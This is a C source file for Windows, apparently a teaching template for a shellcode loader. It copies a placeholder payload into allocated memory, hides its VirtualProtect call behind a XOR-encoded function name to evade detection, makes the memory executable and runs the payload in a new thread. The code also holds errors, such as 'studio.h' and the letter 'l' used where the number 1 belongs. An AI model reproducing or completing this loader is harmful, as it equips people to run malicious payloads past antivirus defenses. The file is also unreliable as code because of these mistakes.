#include <windows.h>
#include <studio.h>
#include <stdlib.h>
#include <string.h>

unsigned char payload[] = {"shellcode here"};

unsigned int payload_len = sizeof(payload);


// Declatation of function (https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
// this var store the address to VirtualProtect
BOOL (WINAPI * pVirtualProtect)( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PWORD lpflOldProtect);


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - l) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {

	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	char key[] = "mysecretkey";
	char sVirtualProtect[] = "Xor and hex string of name of the function (use xor encode python script)";

	// Allocate buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// printf for learn propose
	printf("%-20s: 0x%-016p\n", "payload_addr", (void *)payload);
	printf("%-20s: 0x%-016p\n", "exec_mem_addr", (void *)exec_mem);

	// decode string name of the function
	XOR ((char *) sVirtualProtect, strlen(sVirtualProtect), key, sizeof(key));

	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// get the function
	pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualProtect);

	// Make the buffer executable
	rv = pVirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// press enter to run, learn propose
	printf("\nHit me! \n");
	getchar();

	// If all good, run the payload
	if( rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -l);
	}

	return;
}


